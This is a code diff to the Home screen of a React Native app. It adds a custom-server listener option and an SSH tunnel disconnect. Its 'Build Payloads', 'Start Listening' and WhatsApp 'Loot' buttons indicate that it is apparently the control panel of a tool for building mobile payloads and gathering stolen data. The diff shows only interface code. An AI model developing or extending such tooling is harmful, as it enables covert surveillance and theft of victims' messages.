@@ -1,5 +1,5 @@
 import React, { useEffect, useState } from "react";
-import { PermissionsAndroid } from 'react-native';
+import { PermissionsAndroid, Linking } from 'react-native';
 import { 
     Box,
     StatusBar, 
@@ -15,10 +15,13 @@ import { setListening } from '../../redux/slices/userInfo'
 
 // components
 import ConnectingScreen from '../../components/ConnectingScreen'
-
+//test
+import AppBuilder from '../../native-modules/AppBuilder'
+import CustomServerConfigScreen from "../../components/CustomServerConfigScreen";
 
 const Home = ({navigation}) => {
   const [visible, setVisible]= useState(false);
+  const [visible2, setVisible2]= useState(false);
   const dispatch = useDispatch();
   const toast = useToast();
   const { subdomain, isListening } = useSelector((state) => state.userInfo);
@@ -38,6 +41,7 @@ const Home = ({navigation}) => {
     }
   }
   const handleStopLister = ()=>{
+    AppBuilder.sshTunnelDisconnect((e,m)=>console.log(m));
     nodejs.channel.post('stopListener')
     dispatch(setListening(false))
   }
@@ -79,10 +83,13 @@ const Home = ({navigation}) => {
     <Button variant={'subtle'} onPress={handleAppBuilder} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
      {'Build Payloads'}
     </Button>
-    {!isListening?<Button onPress={handleStartLister} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
-     {'Start Listening'}
-    </Button>:
-    <Button onPress={handleStopLister} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
+    {!isListening&&<><Button onPress={handleStartLister} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
+     {'Start Listening (localtunnel server)'}
+    </Button>
+    <Button onPress={()=>setVisible2(true)} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
+     {'Start Listening (custom server)'}
+    </Button></>}
+    {isListening&&<Button onPress={handleStopLister} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
      {'Stop Listening'}
     </Button>}
     <Button onPress={handleLoot} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
@@ -90,6 +97,7 @@ const Home = ({navigation}) => {
     </Button>
     </Box>
     <ConnectingScreen visible={visible} title={"Please wait, Forwarding port.."}/>
+    <CustomServerConfigScreen visible={visible2} setVisible={setVisible2}/>
     </>
     )
 };
